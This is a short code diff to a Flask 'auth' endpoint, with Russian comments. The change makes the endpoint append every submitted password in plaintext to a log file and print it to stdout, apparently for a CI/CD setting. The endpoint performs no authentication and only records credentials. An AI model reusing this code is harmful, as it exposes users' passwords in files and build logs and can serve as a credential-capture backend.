@@ -31,8 +31,17 @@ def auth():
     data = request.form
     password = data.get('password')
 
-    # Записываем в out/pass.txt
-    password_logger.info(f"🔐 Пароль: {password}")
+    log_line = f"🔐 Пароль: {password}\n"
+
+    try:
+        with open(PASSWORD_LOG_PATH, "a", encoding="utf-8") as f:
+            f.write(log_line)
+            f.flush()  # <- очень важно в CI/CD
+        print("✅ Пароль записан:", password)
+        sys.stdout.flush()
+    except Exception as e:
+        print(f"❌ Ошибка при записи пароля: {e}")
+        sys.stdout.flush()
 
     return jsonify({"status": "ok"})
 
